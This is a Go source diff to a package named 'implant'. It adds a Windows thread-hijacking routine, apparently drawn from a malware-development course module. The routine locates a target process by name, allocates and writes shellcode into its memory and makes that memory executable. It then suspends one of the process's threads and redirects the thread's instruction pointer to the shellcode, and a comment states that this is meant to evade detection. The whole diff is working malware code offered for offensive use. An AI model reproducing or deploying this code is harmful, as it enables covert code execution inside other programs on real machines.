@@ -4,6 +4,7 @@ package implant
 
 import (
 	"fmt"
+	"strings"
 	"syscall"
 	"unsafe"
 )
@@ -142,4 +143,169 @@ func InjectShellcodeThreadHijack(shellcode []byte) error {
 		}
 	}
 	return fmt.Errorf("all thread hijack candidates failed")
+}
+
+// ── Thread hijacking via remote thread enumeration (MalDev Module 36) ──
+
+const (
+	TH32CS_SNAPTHREAD = 0x00000004
+	THREAD_ALL_ACCESS = 0x001F03FF
+)
+
+var (
+	pThread32First = modKernel32.NewProc("Thread32First")
+	pThread32Next  = modKernel32.NewProc("Thread32Next")
+	pOpenThread    = modKernel32.NewProc("OpenThread")
+	pSuspendThread = modKernel32.NewProc("SuspendThread")
+)
+
+// THREADENTRY32 mirrors the Windows THREADENTRY32 structure.
+type THREADENTRY32 struct {
+	Size           uint32
+	Usage          uint32
+	ThreadID       uint32
+	OwnerProcessID uint32
+	BasePriority   int32
+	DeltaPriority  int32
+	Flags          uint32
+}
+
+// findProcessFold returns the PID of the first process matching name,
+// case-insensitively (mirrors lstrcmpiW used in the MalDev module).
+func findProcessFold(name string) (uint32, error) {
+	const TH32CS_SNAPPROCESS = 0x00000002
+
+	snap, _, err := pCreateToolhelp32Snap.Call(TH32CS_SNAPPROCESS, 0)
+	if snap == 0 || snap == ^uintptr(0) {
+		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
+	}
+	defer syscall.CloseHandle(syscall.Handle(snap))
+
+	type PROCESSENTRY32W struct {
+		Size            uint32
+		Usage           uint32
+		ProcessID       uint32
+		DefaultHeapID   uintptr
+		ModuleID        uint32
+		Threads         uint32
+		ParentProcessID uint32
+		PriClassBase    int32
+		Flags           uint32
+		ExeFile         [260]uint16
+	}
+
+	var e PROCESSENTRY32W
+	e.Size = uint32(unsafe.Sizeof(e))
+	ret, _, _ := pProcess32First.Call(snap, uintptr(unsafe.Pointer(&e)))
+	if ret == 0 {
+		return 0, fmt.Errorf("Process32First failed")
+	}
+	for {
+		if strings.EqualFold(syscall.UTF16ToString(e.ExeFile[:]), name) {
+			return e.ProcessID, nil
+		}
+		ret, _, _ = pProcess32Next.Call(snap, uintptr(unsafe.Pointer(&e)))
+		if ret == 0 {
+			break
+		}
+	}
+	return 0, fmt.Errorf("process %s not found", name)
+}
+
+// ThreadHijackRemoteEnum finds an existing process by name, picks one of its
+// threads, injects shellcode into the process, then suspends and hijacks that
+// thread's instruction pointer. No sacrificial process or remote thread is
+// created, so it blends into the target's existing execution flow.
+func ThreadHijackRemoteEnum(processName string, shellcode []byte) error {
+	if len(shellcode) == 0 {
+		return fmt.Errorf("empty shellcode")
+	}
+
+	pid, err := findProcessFold(processName)
+	if err != nil {
+		return err
+	}
+
+	hProcess, _, errCode := pOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
+	if hProcess == 0 {
+		return fmt.Errorf("OpenProcess failed: %v", errCode)
+	}
+	defer syscall.CloseHandle(syscall.Handle(hProcess))
+
+	snap, _, errCode := pCreateToolhelp32Snap.Call(TH32CS_SNAPTHREAD, 0)
+	if snap == 0 || snap == ^uintptr(0) {
+		return fmt.Errorf("CreateToolhelp32Snapshot(thread) failed: %v", errCode)
+	}
+	defer syscall.CloseHandle(syscall.Handle(snap))
+
+	var thr THREADENTRY32
+	thr.Size = uint32(unsafe.Sizeof(thr))
+	ret, _, _ := pThread32First.Call(snap, uintptr(unsafe.Pointer(&thr)))
+	if ret == 0 {
+		return fmt.Errorf("Thread32First failed")
+	}
+
+	var hThread uintptr
+	for {
+		if thr.OwnerProcessID == pid {
+			hThread, _, _ = pOpenThread.Call(THREAD_ALL_ACCESS, 0, uintptr(thr.ThreadID))
+			if hThread != 0 {
+				break
+			}
+		}
+		ret, _, _ = pThread32Next.Call(snap, uintptr(unsafe.Pointer(&thr)))
+		if ret == 0 {
+			break
+		}
+	}
+	if hThread == 0 {
+		return fmt.Errorf("no thread found for process %s", processName)
+	}
+	defer syscall.CloseHandle(syscall.Handle(hThread))
+
+	remoteAddr, _, errCode := procVirtualAllocEx.Call(
+		hProcess, 0, uintptr(len(shellcode)),
+		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
+	)
+	if remoteAddr == 0 {
+		return fmt.Errorf("VirtualAllocEx failed: %v", errCode)
+	}
+
+	var written uintptr
+	ret, _, errCode = pWriteProcessMemory.Call(
+		hProcess, remoteAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&written)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("WriteProcessMemory failed: %v", errCode)
+	}
+
+	var oldProtect uint32
+	pVirtualProtectEx.Call(
+		hProcess, remoteAddr, uintptr(len(shellcode)),
+		PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)),
+	)
+
+	// Suspend, hijack Rip, then resume.
+	suspendRet, _, _ := pSuspendThread.Call(hThread)
+	if suspendRet == 0xFFFFFFFF {
+		return fmt.Errorf("SuspendThread failed")
+	}
+
+	ctx := x64Context{ContextFlags: CONTEXT_CONTROL}
+	ret, _, errCode = pGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
+	if ret == 0 {
+		return fmt.Errorf("GetThreadContext failed: %v", errCode)
+	}
+	ctx.Rip = uint64(remoteAddr)
+
+	ret, _, errCode = pSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
+	if ret == 0 {
+		return fmt.Errorf("SetThreadContext failed: %v", errCode)
+	}
+
+	pResumeThread.Call(hThread)
+
+	return nil
 }
